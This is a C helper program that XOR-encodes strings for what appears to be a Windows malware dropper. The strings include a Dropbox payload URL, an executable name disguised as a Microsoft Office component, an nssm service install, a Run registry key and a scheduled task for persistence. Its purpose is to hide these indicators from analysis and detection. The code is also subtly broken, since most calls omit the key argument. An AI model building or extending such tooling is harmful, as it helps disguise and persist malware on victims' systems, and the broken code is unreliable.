#include <stdio.h>
#include <string.h>

void encrypt_string(const char* name, const char* str, unsigned char key) {
    printf("#define %s_KEY 0x%02X\n", name, key);
    printf("#define %s_ENC { ", name);
    for(size_t i = 0; i < strlen(str); i++) {
        printf("0x%02X,", (unsigned char)(str[i] ^ key));
    }
    printf("0x00 }\n");
}

int main() {
    encrypt_string("URL_STR", "https://www.dropbox.com/scl/fi/4ni8nstmgz877gf3nt1a3/mall.zip?rlkey=o4n3iyuw2w7kpojy9nv88aguo&st=x3vaugvb&dl=1", 0x55);
    encrypt_string("hiddenStr", "hidden");
    encrypt_string("procName", "Microsoft@OfficeTempletes.exe");
    encrypt_string("dirPath", "%ProgramData%\\Microsoft\\Windows\\Templates\\mall");
    encrypt_string("exeName", "Microsoft@OfficeTempletes.exe");
    encrypt_string("nssmName", "nssm.exe");
    encrypt_string("configName", "config.json");
    encrypt_string("zipName", "mall.zip");
    encrypt_string("urlStr", "https://www.dropbox.com/scl/fi/4ni8nstmgz877gf3nt1a3/mall.zip?rlkey=o4n3iyuw2w7kpojy9nv88aguo&st=l15q7e53&dl=1");
    encrypt_string("svcName", "Microsoft Service");
    encrypt_string("svcDesc", "Microsoft Office Template Service");
    encrypt_string("regPath", "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    encrypt_string("regName", "OfficeTemplates");
    encrypt_string("taskName", "Microsoft Office Templates Updater");
    encrypt_string("successMsg", "[+] Deployment completed");

    return 0;
}